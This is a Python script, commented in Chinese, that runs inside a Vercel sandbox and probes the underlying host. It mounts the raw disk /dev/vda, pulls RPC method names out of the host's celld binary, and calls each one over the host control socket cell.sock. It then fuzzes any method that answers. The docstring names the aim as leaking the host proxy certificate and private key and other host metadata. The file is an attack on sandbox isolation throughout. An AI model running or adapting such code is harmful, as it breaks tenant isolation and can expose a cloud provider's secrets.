# -*- coding: utf-8 -*-
"""vda45_host_methods: cell.sock 上逐个探测 celld 二进制内的全部 connectrpc 方法
昨天 vda4 只试了 7 个猜测路径 (仅 GetResourceUsage 200)
今天: 用 celld strings 提取的完整方法表 (29 个) 逐个调用, 找非 404 的活路径
重点目标: HostService/GetProxyCertificate (可能泄露 host 代理证书/私钥)
          HostService/GetResourceUsage (host 版 usage, 可能泄露 host 元数据)
          HostService/WaitForDrive / SetOCIImageConfig
          CelldService/GetDriveStorageUsage 等
输出落盘 + 哨兵 V45D_DONE"""
import os, time, socket, ctypes, re

OUT = '/vercel/sandbox/v45d.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    if not os.path.exists(sp):
        log('cell.sock MISSING -> abort')
        f.close()
        return

    # P1: 从 celld 二进制提取方法表
    log('=== P1 extract methods from celld ===')
    methods = []
    try:
        data = open('/mnt/vdax/opt/vercel/celld', 'rb').read()
        txt = b'\n'.join(re.findall(rb'[\x20-\x7e]{6,}', data)).decode(errors='replace')
        methods = sorted(set(re.findall(r'vercel\.hive\.[A-Za-z0-9_.]+Service/[A-Z][A-Za-z0-9]{2,}', txt)))
        log('methods (%d): %s' % (len(methods), methods))
    except Exception as e:
        log('P1 ERR %s' % e)

    # P2: 逐个探测 (JSON body 空对象; 部分方法给最小字段)
    log('=== P2 probe all methods ===')
    ALIVE = []
    for m in methods:
        # 转换: vercel.hive.host.api.v1.HostService/CreateSnapshot
        #        -> /vercel.hive.host.api.v1.HostService/CreateSnapshot
        path = '/' + m
        body = '{}'
        # 特殊方法给字段
        low = m.lower()
        if 'getproxycertificate' in low or 'waitfordrive' in low or 'getresourceusage' in low \
                or 'getdrive' in low or 'getocimageconfig' in low:
            body = '{}'
        elif 'setocimageconfig' in low:
            body = '{"drive_id":""}'
        elif 'configure' in low:
            body = '{}'
        t0 = time.time()
        st, bd = rpc_unix(sp, path, body, t=3)
        dt = time.time() - t0
        alive = st.startswith('HTTP') and '404' not in st
        log('%-70s -> %s (%.2fs) | %s%s' % (m, st, dt, bd[:200].replace('\n', ' '),
                                            '  <<< ALIVE' if alive else ''))
        if alive:
            ALIVE.append((m, st, bd[:300]))
        time.sleep(0.15)

    # P3: 对 ALIVE 的方法做字段枚举 (空 body / null / 已知字段)
    log('=== P3 deep on ALIVE ===')
    for m, st0, bd0 in ALIVE:
        path = '/' + m
        for body in ['', 'null', '[]', '{}', '{"drive_id":"a"}']:
            st, bd = rpc_unix(sp, path, body, t=3)
            log('deep %-55s body=%-16s -> %s | %s' % (m, body, st, bd[:200].replace('\n', ' ')))
            time.sleep(0.15)

    log('ALIVE_LIST=%s' % [(m, st) for m, st, _ in ALIVE])
    log('V45D_DONE')
    f.close()


if __name__ == '__main__':
    main()
